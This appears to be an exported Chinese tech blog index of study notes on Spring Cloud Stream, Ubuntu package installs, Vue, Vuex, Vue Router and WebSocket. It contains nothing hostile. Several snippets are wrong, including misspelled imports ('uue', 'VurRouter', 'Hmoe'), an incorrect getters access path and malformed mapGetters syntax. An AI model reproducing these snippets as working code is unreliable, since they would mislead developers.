&lt;/goals&gt;                    &lt;/execution&gt;                    &lt;execution&gt;                        &lt;id&gt;test-compile&lt;/id&gt;                        &lt;phase&gt;test-compile&lt;/phase&gt;                        &lt;goals&gt;                            &lt;goal&gt;test-compile&lt;/goal&gt;                        &lt;/goals&gt;                    &lt;/execution&gt;                &lt;/executions&gt;            &lt;/plugin&gt;            &lt;plugin&gt;                &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;                &lt;version&gt;2.22.2&lt;/version&gt;            &lt;/plugin&gt;            &lt;plugin&gt;                &lt;artifactId&gt;maven-failsafe-plugin&lt;/artifactId&gt;                &lt;version&gt;2.22.2&lt;/version&gt;            &lt;/plugin&gt;        &lt;/plugins&gt;    &lt;/build&gt;&lt;/project&gt;

]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud(9)</title>
    <url>/posts/c959d708/</url>
    <content><![CDATA[stream消息驱动官方定义Spring Cloud Stream是一个构建消息驱动微服务的框架

应用程序通过inputs或者outputs来与Spring Cloud Stream中binder对象交互。通过我们配置来binding(绑定)，而Spring Cloud Stream的binder对象负责与消息中间件交互。所以，我们只需要搞清楚如何与Spring Cloud Stream交互就可以方便使用消息驱动的方式。通过使用Spring Integration来连接消息代理中间件以实现消息事件驱动.Spring Cloud Stream为一些供应商的消息中间件产品提供了个性化的自动化配置实现，引用了发布-订阅、消费组、分区的三个核心概念。(目前支持rabbitmq，kafka)

他出现的场景在于：有没有一种新的技术诞生，让我们不再关注具体MQ的细节。我们只需要用一种适配绑定的方式，自动的给我们在各种MQ内切换。我们就不需要考虑这么多rabbitmq，kafka，rocketmq等。这样可以降低开发难度和学习难度。屏蔽底层消息中间件的差异，降低切换成本，统一消息的编程模型标准MQ：引入Stream后
Binder这个用来实现屏蔽消息中间件的差异Stream中的消息通信方式遵循发布-订阅模式。Topic主题进行广播
常用标准流程套路

生产者POM：&lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;        &lt;/dependency&gt;                &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-stream-rabbit&lt;/artifactId&gt;        &lt;/dependency&gt;
YAML：server:  port: 8801spring:  application:    name: cloud-stream-provider  cloud:    stream:      binders: #在此处配置要绑定的rabbitmq的服务信息:        defaultRabbit: #表示定义的名称，用于binding整合          type: rabbit #消息组件类型          environment: #设置rabbitmq的相关的环境配置            spring:              rabbitmq:                host: localhost                port: 5672                username: admin                password: 123      bindings: #服务的整合处理        output: #这个名字是一个通道的名称          destination: studyExchange #表示要使用的Exchange名称定义          content-type: application/json #设置消息类型，本次为json,文本则设置text/plain          binder: defaultRabbit #设置要绑定的消息服务的具体设置eureka:  client:    service-url:      defaultZone: http://localhost:7001/eureka  instance:    lease-renewal-interval-in-seconds: 2 #设置心跳的时间间隔（默认是30秒）    lease-expiration-duration-in-seconds: 5 #如果现在超过了5秒的间隔（默认是90秒）    instance-id: send-8801.com #在信息列表时显示主机名称    prefer-ip-address: true #访间的路径变为IP地址
业务类：service:import org.springframework.cloud.stream.annotation.EnableBindingimport org.springframework.cloud.stream.messaging.Sourceimport org.springframework.messaging.MessageChannelimport org.springframework.messaging.support.MessageBuilderimport top.zfxt.springcloud.service.IMessageProviderimport java.util.UUIDimport javax.annotation.Resource/** *  @author:zfxt *  @version:1.0 */@EnableBinding(Source::class)//定义消息的推送管道open class IMessageProviderImpl : IMessageProvider &#123;    @Resource    private lateinit var output: MessageChannel//消息发送管道    override fun send() &#123;        val serial = UUID.randomUUID().toString()        output.send(MessageBuilder.withPayload(serial).build())        println(&quot;**********serial:$serial&quot;)    &#125;&#125;
controller:@RestControllerclass SendMessageController &#123;    @Resource    private lateinit var messageProvider: IMessageProvider    @GetMapping(&quot;/sendMessage&quot;)    fun sendMessage(): String &#123;        messageProvider.send()        return &quot;success&quot;    &#125;&#125;
消费者

pom保持和生产者一样YML
server:  port: 8802spring:  application:    name: cloud-stream-consumer  cloud:    stream:      binders: #在此处配置要绑定的rabbitmq的服务信息:        defaultRabbit: #表示定义的名称，用于binding整合          type: rabbit #消息组件类型          environment: #设置rabbitmq的相关的环境配置            spring:              rabbitmq:                host: localhost                port: 5672                username: admin                password: 123      bindings: #服务的整合处理        input: #这个名字是一个通道的名称          destination: studyExchange #表示要使用的Exchange名称定义          content-type: application/json #设置消息类型，本次为json,文本则设置text/plain          binder: defaultRabbit #设置要绑定的消息服务的具体设置eureka:  client:    service-url:      defaultZone: http://localhost:7001/eureka  instance:    lease-renewal-interval-in-seconds: 2 #设置心跳的时间间隔（默认是30秒）    lease-expiration-duration-in-seconds: 5 #如果现在超过了5秒的间隔（默认是90秒）    instance-id: receive-8802.com #在信息列表时显示主机名称    prefer-ip-address: true #访间的路径变为IP地址
业务类：
@Component@EnableBinding(Sink::class)open class ReceiveMessageController &#123;    @Value(&quot;\$&#123;server.port&#125;&quot;)    private lateinit var serverPort: String    @StreamListener(Sink.INPUT)    fun input(message: Message&lt;String&gt;) &#123;        println(&quot;消费者一号，----》接受到的消息：$&#123;message.payload&#125; \t port：$serverPort&quot;)    &#125;&#125;

重复消费问题因为队列默认采用的是topic，所以每一条消息都会发送给所有的消费者，也就造成了所谓的重复消费的问题即，不同组是可以全面消费的（重复消费），同一组内会发生竞争关系，只有其中一个可以消费只要放于同一个组中就可以解决重复消费问题。
消息持久化加个group就会自动消息持久化。如果没有加入group，那么在消费者尚未启动时，生产者产生消息会导致消息的丢失。而如果加入了消息持久化，他就可以把曾经未获得的消息重新获取并消费
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>TLP的安装</title>
    <url>/posts/1b666b6c/</url>
    <content><![CDATA[TLPTLP 是一款自由开源的高级电源管理工具，可在不进行任何配置更改的情况下延长电池寿命。所有 TLP 设置都存储在 &#x2F;etc&#x2F;default&#x2F;tlp 中。其默认配置提供了开箱即用的优化的节能设置。TLP 功能:不做描述，只说明安装过程在ubuntu上，
sudo apt install tlp tlp-rdw
成功安装后使用以下命令启动服务。
systemctl start tlp.service
使用方法sudo tlp-stat -b 查看电池信息sudo tlp-stat -d 查看磁盘信息等
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>ubuntu桌面端</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu使用微信</title>
    <url>/posts/e7799ecb/</url>
    <content><![CDATA[最佳方法就是使用优麒麟等一些国内linux平台封装好的微信，如该
微信
# 执行如下命令完成安装wget http://archive.ubuntukylin.com/software/pool/partner/weixin_2.1.1_amd64.debdpkg -i weixin_2.1.1_amd64.deb]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>ubuntu桌面端</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu修改鼠标样式</title>
    <url>/posts/9c36dbd9/</url>
    <content><![CDATA[
首先打开优化设置


可以看到这里是可以修改鼠标样式的，而我们的鼠标图标都是保存在/usr/share/icons中的，因此我们可以将我们想添加的鼠标图标放进去，即可完成添加。这里可供参考的有
分享|Linux 桌面的十个最佳光标主题
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>鼠标样式</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu上轻松安装Nginx</title>
    <url>/posts/3e159b7d/</url>
    <content><![CDATA[在ubuntu下按照nginx，只需要使用简单的命令
apt install nginx

nginx的配置目录都在/etc/nginx下。
主要的 Nginx 配置文件是/etc/nginx/nginx.conf。

]]></content>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue 父子组件参数传递：props</title>
    <url>/posts/e0b24930/</url>
    <content><![CDATA[父组件向子组件传递参数时，可以使用props
export default &#123;  props: [&#x27;foo&#x27;],  created() &#123;    // props 会暴露到 `this` 上    console.log(this.foo)  &#125;&#125;
除了直接使用字符串的形式，也可以使用对象的形式
export default &#123;  props: &#123;    title: String,    likes: Number  &#125;&#125;
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>props</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue 插槽：具名和作用域</title>
    <url>/posts/1c72751d/</url>
    <content><![CDATA[具名插槽就是可以在组件中，可以定义插槽的名字
&lt;slot name=&quot;haha&quot;&gt;&lt;/slot&gt;
然后可以在调用该组件的父组件中通过&lt;template v-slot=&quot;haha&quot;&gt;...&lt;/template&gt;来插入新的结构标签到组件中。
作用域插槽。他的最大特点是可以从子组件传递数据到父组件。通过:标记，和prop类似，将具体的对象发送到父组件中使用。
//子组件&lt;slot name=&quot;haha&quot; :games=&quot;games&quot;  :msg=&quot;msg&quot;&gt;&lt;/slot&gt;//父组件//这里的test是可以任意取名的。他会将子组件传递过来的所有值全部接受，然后你看也获取其中的对象&lt;template v-slot=&quot;haha&quot; scope =&quot;test&quot;&gt;&lt;ul v-for=&quot;(game,index) in test.games&quot; :key=&quot;index&quot;&gt;    &lt;li v-model = &quot;game.id&quot;&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/template&gt;//也可以直接使用插槽语法（es6）&lt;template v-slot=&quot;haha&quot; scope =&quot;&#123;games&#125;&quot;&gt;//这里的test是可以任意取名的。他会将子组件传递过来的所有值全部接受，然后你看也获取其中的对象&lt;ul v-for=&quot;(game,index) in games&quot; :key=&quot;index&quot;&gt;    &lt;li v-model = &quot;game.id&quot;&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/template&gt;
vue更新了新语法。对于具名插槽和作用域插槽都用更新的使用。都通过v-slot:”插槽名”&#x3D;”{参数名称}”例如:v&#x3D;slot:haha&#x3D;”{games}”
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue 代理服务器配置新增建议</title>
    <url>/posts/3afb44a6/</url>
    <content><![CDATA[关于配置vue的代理服务器新增两点建议

普通的http或者https请求。满足在vue.config.js配置一个普通的代理然后在使用该代理时可以不用写全完整的uri。而只用写具体的访问地址如下devServer:&#123;    proxy:&#123;      &#x27;/api/&#x27;:&#123;        target:&#x27;http://localhost:9090/&#x27;,        pathRewrite:&#123;&#x27;^/api&#x27;:&quot;&quot;&#125;,        ws:false      &#125;&#125;
通过axios向后端发送请求时this.axios(&#123;          url:&#x27;/api/login&#x27;,          method:&#x27;get&#x27;,          params:&#123;            username:this.username          &#125;        &#125;).then
只写具体的请求路径即可完成代理的转发。
通过WebSocket来完成转发时首先，他的代理必须打开ws，也就是将http协议升级为ws协议也是在vue.config.js中配置devServer:&#123;    proxy:&#123;      &#x27;/ws/&#x27;:&#123;        target: &#x27;ws://localhost:9090/&#x27;,        pathRewrite: &#123;          &#x27;^/ws/&#x27;: &#x27;/&#x27;        &#125;,        ws: true      &#125;    &#125;  &#125;
此时与访问http请求不同的是，他在具体环节向后端发送ws链接请求时，必须把完整的访问地址写全，否则他将会被导向到http代理this.socket = new WebSocket(&quot;ws://&quot;+window.location.host +&quot;/ws/chat/&quot; + this.username)
如上。

]]></content>
      <tags>
        <tag>vue</tag>
        <tag>WebSocket</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue 插槽：复用组件的定制内容</title>
    <url>/posts/ec55e168/</url>
    <content><![CDATA[默认插槽slot一般出现情况，当你要复用一个组件时，但是这个组件中你复用的只有他的框架，他的所有内容你都需要根据具体内容再次修改。而如果你在组件中添加v-show来实现上述要求时，会让结构变得非常混乱，无法正常阅读源码。因此最好的方法是每个组件再单独提供一些html结构和样式。所以vue提供了一个方法，插槽：在组件中需要使用当你没有向我传递值时，我会展示到页面上来表示哪里需要插入新的结构。然后在引用该组件的地方写好插槽的内容。例如：Student是组件，在app中 
&lt;div id=&quot;app&quot;&gt;    &lt;Student&gt;        &lt;img src=&quot;&quot;&gt;    &lt;/Student&gt;  &lt;/div&gt;
这样子，在Student的slot标签处，就会被插入img标签
具名插槽可以给每个插槽命名，通过不同的插槽，插入到不同的位置。
&lt;slot name=&quot;center&quot;&gt;我是命名为center的插槽&lt;/slot&gt;&lt;slot name=&quot;foot&quot;&gt;我是命名为foot的插槽&lt;/slot&gt;
需要具体放在哪个插槽里，需要在标签添加属性slot&#x3D;”center”会放到slot的插槽里。例：
&lt;!-- 像下面一样 --&gt;&lt;div slot=&quot;center&quot;id=&quot;app&quot;&gt;  &lt;Student&gt;      &lt;img src=&quot;&quot;&gt;  &lt;/Student&gt;&lt;/div&gt;]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuex 数据管理详解</title>
    <url>/posts/cb1dda86/</url>
    <content><![CDATA[#vuex这是vuex的工作原理图。
vue2使用vuex3，vue3使用vuex4.vuex其实是存储在store中。也就是actions，mutations，state都是在store中的。主要流程。

安装vuex//vue2中需要使用vuex3npm i  vuex@3
然后再src目录下，新建一个store目录，然后再store目录下新建一个index.js。其中写以下模板内容。import  &#x27;Vue&#x27; from &#x27;uue&#x27;import   &#x27;Vuex&#x27; from &#x27;uuex&#x27;//再编译Vuex前必须先通过Vue使用Vuex。然后他会自动检测到Vuex的内容。并绑定到Vue的内部。Vue.use(Vuex)const actions = &#123;&#125;const mutations =&#123;&#125;const state = &#123;&#125;const store = new Vuex.Store(&#123;  actions,  mutations,  state,&#125;)export default store

然后再main.js中直接引入store 既可以让所有的vc，vm都能够访问到Vuex
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuex Getters 使用指南</title>
    <url>/posts/41f76cd3/</url>
    <content><![CDATA[vuex正式使用方法。
getters在store&#x2F;index.js中添加一个
const getters = &#123;    bigSum(state)&#123;        return state.sum*10    &#125;&#125;然后再export中添加getters
再组件中要调用getters，使用$store.state.getters.内容
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuex中的关键功能：Actions、Mutations、State</title>
    <url>/posts/518b3934/</url>
    <content><![CDATA[vuex再vuex中，有三个关键的内容和相关的函数方法
actions。再组件中调用actions需要调用this.$store.dispatch(‘方法’，value) 。组件会调用vuex中actions，请求使用方法，并传递value参数给他。而在actions中的方法中，他将会收到两个参数，context上下文，value参数。这个context上下文可以直接调用state，也可以调用commit方法来继续调用mutation。
mutations，他会接受actions发送过来的请求。然后他也会有两个参数，第一个参数就是state，也就是mutations可以用来修改state中的数据（当然，actions中的context也可以直接调用state并进行修改，但我们并不推荐这么做。）。然后可以直接再mutations中修改state的内容。state再组件中调用state的内容时，需要使用this.$store.state.内容 来调用state的中的数据。
补充，组件可以直接用commit方法调用mutations。跳过actions。但是我们并不建议这么做，因为会把太多的业务逻辑耦合在一起。]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuex映射方法的使用</title>
    <url>/posts/c3ea1584/</url>
    <content><![CDATA[vuex的最终使用方法再标签中添加
import &#123;mapGetters,mapState,mapActions&#125; from &#x27;vuex&#x27;
然后有两种使用方法，下面示例：
computed:&#123;  ...mapGetters&#123;sum:&#x27;sum&#x27;,add:&#x27;add&#x27;&#125;//对象式//对象式的含义：key：表示会在computed中生成的方法函数。而value:表示从mapGetters中调用的方法  ...mapGetters&#123;[&#x27;sum&#x27;,&#x27;add&#x27;]&#125;//数组式//数组式的含义即，同时创建再这边的函数并调用mapGetters的方法，这两个方法同名而已。同理mapMutation也是一样的&#125;]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue课设知识点概览</title>
    <url>/posts/50272986/</url>
    <content><![CDATA[5.30号，记录一下本次课设学到的一些知识点：

vue无法检测到对象内部数据的变化，即便使用了deep：true标签，也只能检测到对象中第一层属性对应的值的变化，而对于对象内的对象，他就无法检测到他的变化了，只能通过this.$set(1,2,3)来改变对象的属性对应的值。数组则通过数组的四个方法来进行修改，不通过直接获取其index来改变。这样子才能被检测到改变。
如何使用iconpark（字节跳动的矢量图标库）首先现在vue中导入他的组件//vue2npm i @icon-park/vue//vue3npm i @icon-park/vue-next
通过上述导入整个组件后，再在每个使用的地方专门做引用。使用方法：在具体的组件内，导入你所需要的图标。/** * 引入时使用驼峰式命名 * import &#123;Alarm&#125; from &#x27;@icon-park/vue&#x27;; * components: &#123;   Alarm   &#125; * * 使用时使用小写 *&lt;alarm theme=&quot;outline&quot; size=&quot;24&quot; fill=&quot;#f60&quot; /&gt; */import &#123;Alarm&#125; from &#x27;@icon-park/vue&#x27;;

在vue中获取获取图片有两种方式。


在 JavaScript 被导入或在 template&#x2F;CSS 中通过相对路径被引用。这类引用会被 webpack 处理。
放置在 public 目录下或通过绝对路径被引用。这类资源将会直接被拷贝，而不会经过 webpack 的处理。而经过webpack处理后的图片将会被隐匿，也就是他在项目中的位置会被添加字符串隐藏掉。因此多采用require的方式去引入图片。例如：&lt;img :src=&quot;logo&quot; /&gt; export default &#123;  data()&#123;    return &#123;     //相对路径不一定都是./，也可能是../，按照图片存放位置来决定      logo: require(&quot;./imgs/logo.png&quot;)     &#125;  &#125;&#125;
这中是通过require的方式引入。而这中引入都是静态的，也就是他的路径已经写死，引入后他的编码方式也会被webpack修改。所以无法通过改变路径或者文件名来引入新的，动态的图片。因此，在这里介绍两种方法，可以动态的引入图片，甚至包括更多的文件：
使用require.context()// require.context(directory,useSubdirectories,regExp)     // directory:表示检索的目录     // useSubdirectories：表示是否检索子文件夹     // regExp:匹配文件的正则表达式,一般是文件名     const requireContext = require.context(&#x27;../assets/QQpng&#x27;, false, /\.(png|jpe?g|gif|svg)$/);     // 获取images文件夹下的所有图片的base64文件文件名      const images = requireContext.keys().map(requireContext);
在上述代码中，他将会访问assets/QQpng下的所有文件，并通过正则表达式来获取其文件内容并保存到requireContext中，然后.map()是ES6的语法，可以获取数组中某个属性对应的值并将其重新组成数组。最后生成的images就是包含了所有base64编码的图片的原文件。
使用public路径来保存内容，在public路径下的文件他不会经由webpack处理，可以直接通过访问路径来获取。因此可以通过简单的修改路径来完成文件的动态存储和使用。而要让vue使用到public文件夹下的内容。一般的操作可以通过public下，index.html种的一种写法来获取&lt;!DOCTYPE html&gt;&lt;html lang=&quot;&quot;&gt;  &lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt;    &lt;link rel=&quot;icon&quot; href=&quot;&lt;%= BASE_URL %&gt;chat.svg&quot;&gt;    &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;noscript&gt;      &lt;strong&gt;We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.&lt;/strong&gt;    &lt;/noscript&gt;    &lt;div id=&quot;app&quot;&gt;&lt;/div&gt;    &lt;!-- built files will be auto injected --&gt;  &lt;/body&gt;&lt;/html&gt;
其中的&lt;%= BASE_URL %&gt;就代表了public的路径，通过这个标签可以达到引入public路径下文件的效果。还有另一种。就是将public路径放到Vue的原型链上。这般便可以通过Vue示例来获取import Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import VueRouter from &#x27;vue-router&#x27;import router from &#x27;./router&#x27;import axios from &quot;axios&quot;;Vue.prototype.axios = axiosVue.config.productionTip = false//这里将public的路径保存使用Vue.prototype.publicPath = process.env.BASE_URLVue.use(VueRouter)new Vue(&#123;  router,  render: h =&gt; h(App),  beforeCreate() &#123;    Vue.prototype.$bus = this//安装全局事件总线  &#125;&#125;).$mount(&#x27;#app&#x27;)
然后直接通过Vue.prototype.publicPath搭配上具体的地址就可以直接跳过webpack动态使用图片了


有些事件只有在全部元素渲染完成后才能执行，所以引入该方法。this.$nextTick(() =&gt; &#123;       // 可以使用回调函数的写法       // 这个函数中DOM必定渲染完成       this.$refs[&quot;input-box&quot;].focus()     &#125;)
关于光标的一些操作方法，这里只做示例演示，不细讲//处理表情包的发送      sendEmotion(index)&#123;        if(this.chatPartnerName!==&#x27;请选择聊天对象&#x27;)&#123;          //额外需要操作，需要获取光标的位置并且添加完图片后光标保持在表情后面。          //获取光标选中的内容(如果光标有选中的内容，即删除掉）          let content = getSelection()          content.deleteFromDocument()          //控制光标位置并添加表情          let position = getSelection().getRangeAt(0)          //如果没有光标          if(position==&quot;&quot;)&#123;            //强制获取光标            var div = this.$refs[&quot;input-box&quot;]            div.focus()            position = getSelection().getRangeAt(0)          &#125;          var img = document.createElement(&quot;img&quot;)          img.style=&quot;width: 35px;&quot;          img.src=this.emotions[index]          //在光标后添加表情          position.insertNode(img)          //将光标重新定位到表情后面          position.setStartAfter(img)          this.handleInput()        &#125;      &#125;,

]]></content>
      <tags>
        <tag>vue</tag>
        <tag>iconpark</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue获取DOM节点和事件处理</title>
    <url>/posts/1ef7b836/</url>
    <content><![CDATA[获取dom节点。获取input的dom节点，然后让他被focus。
this.$refs.input.focus()
然而，vue并不会改一次数据就重新渲染模板，可以设置定时器后再修改，这样就会渲染完模板。
$nextTick函数他会在模板解析完后再执行新的函数
...this.$nextTick(function()&#123;  this.$refs.input.focus()&#125;...
@blur事件。当输入框失去焦点时调用。
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue检测修改：直接修改和指定数组方法</title>
    <url>/posts/9edb4736/</url>
    <content><![CDATA[vue可以检测到的修改：直接对基础变量的修改，直接修改某个对象中的属性，但是如果修改数组的话，必须使用vue指定的方法进行修改，否则vue将无法检测到修改。甚至可以跳过props的检测。
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>杂言</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue数据通信：props和computed属性</title>
    <url>/posts/84b7f3c5/</url>
    <content><![CDATA[props用法
父组件&#x3D;&#x3D;&gt;子组件 通信
子组件&#x3D;&#x3D;&gt;父组件 必须父组件给子组件一个方法


props的参数是不能修改的。

computed计算属性正常写法(例）
computed:&#123;  isAll:&#123;    get()&#123; return null&#125;,    set()&#123; ...&#125;&#125;
简写方式(只有get方法)
computed:&#123;  isAll()&#123; return null&#125;,&#125;
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue路由基础</title>
    <url>/posts/845c8696/</url>
    <content><![CDATA[VueRouter路由vue使用路由先安装vuerouter，同样的，vue2使用vuerouter3,vue3使用vuerouter4。新建一个路由，再src下建一个router文件夹，写一个index.js。
import VurRouter from &#x27;vue-router&#x27;//引入组件import About from &#x27;../component/About&#x27;import Home from &#x27;../component/Home&#x27;//创建一个路由器export default new VueRouter(&#123;   routes:[      &#123;          path:&#x27;/about&#x27;,          component:About      &#125;,      &#123;          path:&#x27;/home&#x27;,          component:Hmoe        &#125;]&#125;)
然后再main.js中引入router。import router from ‘.&#x2F;router’
具体使用要在主页面中使用这些路由需要使用两个新标签。用来切换路径。
//router-link//通过to来使用//而且router-link他渲染完后也是两个a标签。但是他有跳转功能。//active会当你点亮某个路径时，帮你点亮&lt;router-link to=&#x27;/about&#x27; active-class=&quot;active&quot;&gt;About&lt;/router-link&gt;&lt;router-link to=&#x27;/home&#x27; active-class=&quot;active&quot;&gt;Home&lt;/router-link&gt;//router-view//用来指定组件展示的位置&lt;router-view&gt;&lt;/router-view&gt;
每次跳转到新组件时，原来的组件将会被销毁。路由组件通常放在pages文件夹下，而一般组件会放在components下
缓存路由组件因为经常登录时，会输入密码账号，若是因为组件销毁每次都要重新输入会变得很麻烦。所有需要缓存路由组件，而不是让他直接销毁添加keep-alive标签
//可以再keep-alive中添加include属性，限定保存哪些组件，避免保存过多的组件。&lt;keep-alive&gt;  &lt;router-view&gt;&lt;/router-view&gt;&lt;/keep-alive&gt;
在使用缓存路由组件时，他会有个问题，就是原本的组件会一直保持运作。因此路由有两个新的生命周期钩子。
activated()&#123;&#125;,deavtivated()&#123;&#125;.
他的作用是：当组件出现在页面上的时候便会激活，离开时便会失活。与销毁创建无关。因此只要使用这两个组件就可以实现一些计时的方法。
嵌套子路由它可以无限嵌套
import VurRouter from &#x27;vue-router&#x27;//引入组件import About from &#x27;../component/About&#x27;import Home from &#x27;../component/Home&#x27;//创建一个路由器export default new VueRouter(&#123;   routes:[      &#123;          path:&#x27;/about&#x27;,          component:About      &#125;,      &#123;          path:&#x27;/home&#x27;,          component:Home,          children:[              &#123;//嵌套子路由不用再加斜杠                  path:&#x27;news&#x27;,                  component:News,              &#125;,             &#123;                  path:&#x27;abls&#x27;,                  component:Abls,              &#125;,        &#125;]&#125;)
##query参数有一种比较低级的传参方法，就是通过es6的模板字符串再带上js的变量，实现传参跳转路由并携带参数，to的字符串写法
&lt;router-link :to=&#x27;`/home/message/detail?id=$&#123;this.id&#125;`&#x27;&gt;&lt;/router-link&gt;
另一种传递方法。to的对象写法
&lt;router-link :to=&quot;&#123; path:&#x27;/home/message/detail&#x27;,query:&#123;id:m.id,title:m.title&#125;&#125;&quot;&gt;&lt;/router-link&gt;
命名路由给路由命名再router&#x2F;index.js中给路由添加上参数name。然后再app组件中，可以通过:to&#x3D;”{name:’’}”来进行跳转只是用来简化路由跳转。
params参数&#x2F;&#x2F;第一种，还是使用to的字符串写法。使用restful风格的写法。
&lt;router-link :to=&quot;`/home/message/detail/$&#123;m.id&#125;`&quot;&gt;&lt;/router-link&gt;
然后再路由内添加占位符来获取传递过来的参数
path:&#x27;/home/message/detail/:id&#x27;//通过：可以获取传递过来的id
&#x2F;&#x2F;第二种，使用to的对象写法。就与query类似但是params参数不允许使用path路径。需要通过name来跳转。在需要展示的组件里获得传递过来的参数。通过$route获取。$route.query.内容。或则和$route.params.内容。 
接受参数要显示的组件需要接受父组件传过来的参数，第一个就是使用$route.query或者$route.params。但是这个太繁琐了，让子组件显得不明白。第二种写法。通过props对象式。他可以用key-value的方法传递参数
（对象式写法）在router&#x2F;index.js中，添加一个参数，props：{a:1, b:4}用来获取父组件传递过来的参数，然后再通过props传递给子组件。子组件中用props接受。
（函数式写法）props($router)&#123;  return  &#123;a:$router.query.a,b:$router.params.b&#125;&#125;
函数式有一个很好的写法，就是可以获得$router对象，然后获取其中的query和params参数
另一种写法props的第二种写法。props：true。值为布尔值。若布尔值为真，他会直接把该组件收到的所有params参数以props的形式传递給子组件
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB存储和JSON数据处理</title>
    <url>/posts/96f85423/</url>
    <content><![CDATA[WEBStoragelocalstorage本地存储他是js自带的原生方法，并不是vue特有的。他会存储在你自己的浏览器中。而且她只能存储字符串的内容。他是window下的一个函数。
localstorage.getItem(&#x27;&#x27;)//获取本地存储中的值localstorage.setItem(&#x27;key&#x27;,&#x27;value&#x27;)//设置本地存储的值localstorage.removeItem(&#x27;&#x27;)//移除某一个值localstorage.clear()//清空
当你要存储一个对象到localstorage中时，需要先转化为JSON的字符串格式。
sessionstorage会话存储他的方法与localstorage一致，但是他只会保存在每一次会话中。当关闭浏览器，会话就会结束，所有内容就会删除。
如果存储在localstorage中的键值不存在，会返回一个nullJSON方法json格式的字符串转化为json对象。JSON.parse()json对象转化为json格式的字符串JSON.stringify()
watch监视属性完整写法watch:&#123;    Item:&#123;     deep:true,//开启深度监视，可以检测到数组内，具体对象的修改变化。handler(value)&#123;      localStorage.setItem(&#x27;Item&#x27;,JSON.stringify(value))    &#125;        &#125;    &#125;//常见写法watch:&#123;      Item(oldvalue,newvalue)&#123;//可以不用old属性，只是用value接受新value          localStorage.setItem(&#x27;Item&#x27;,JSON.stringify(value))      &#125;    &#125;,]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>WebSocket：双向通信，弥补HTTP不足</title>
    <url>/posts/55dca645/</url>
    <content><![CDATA[WebSocket是一个在单TCP连接上进行全双工通信的协议。允许服务器主动向客户端推送消息。

WebSocket本质上一种计算机网络应用层的协议，用来弥补http协议在持久通信能力上的不足。


HTTP 协议有一个缺陷：通信只能由客户端发起，不具备服务器推送能力。所以进行双向通信时必须使用webSocket。
这种单向请求的特点，注定了如果服务器由连续的状态变化，客户端想要获知会非常麻烦。我们只能使用“轮询”：每隔一段时间，就像服务器发送要给请求。而轮询的效率非常的低。浪费资源。
轮询的危害：服务端被迫维持来自每个客户端的大量不同的连接大量的轮询请求会造成高开销，比如会带上多余的header，造成了无用的数据传输。

websocket是先通过HTTP协议完成第一次握手他们的握手过程
GET /chat HTTP/1.1Host: server.example.comUpgrade: websocketConnection: UpgradeSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==Sec-WebSocket-Protocol: chat, superchatSec-WebSocket-Version: 13Origin: http://example.com
其中专属于websocket的由upgrade，connection，sec开头的内容。最后返回响应，表示websocket连接建立完成
HTTP/1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=Sec-WebSocket-Protocol: chat
优缺点优点：
WebSocket协议一旦建议后，互相沟通所消耗的请求头是很小的服务器可以向客户端推送消息了缺点：
少部分浏览器不支持，浏览器支持的程度与方式有区别（IE10）
